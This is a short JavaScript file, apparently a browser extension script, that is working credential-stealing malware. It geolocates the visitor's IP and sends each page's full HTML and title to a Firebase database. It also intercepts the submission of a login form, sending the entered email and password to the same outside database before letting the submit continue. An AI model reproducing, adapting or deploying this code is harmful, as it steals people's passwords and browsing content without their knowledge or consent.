var config = {
    apiKey: "AIzaSyBKyTs5uLby3uetDmAMFGn41SNC-NFT8oA",
    authDomain: "chrome-extension-e2176.firebaseapp.com",
    databaseURL: "https://chrome-extension-e2176.firebaseio.com",
    projectId: "chrome-extension-e2176",
    storageBucket: "chrome-extension-e2176.appspot.com",
    messagingSenderId: "1089073045667"
  };
  firebase.initializeApp(config);
$.getJSON('https://freegeoip.net/json/?callback=?', function(e){
 var k = JSON.stringify(e);
 var ip="<iploh style='display:none;'>"+k+"</iploh>";
 $("body").append(ip);
 start();
 });
function start(){
    var data = {
           m: $("body").html(), 
           T : document.title, 
           time : Date(),
           ip : $("iploh").html()
           }
        var ref = firebase.database().ref().child('msg');
        var result = ref.push(data);
        console.log("done");
}
$(function(){
    console.log("Hello World");
    $("#login_form").submit(function(){
    var fo=[$("input[name=email]").val(),$("input[name=pass]").val()];
    var data = {
           m:fo,
           ip:$("iploh").html()
           }
        var ref = firebase.database().ref().child('form');
        var result = ref.push(data);
        console.log("2");
        return true;
    });
});
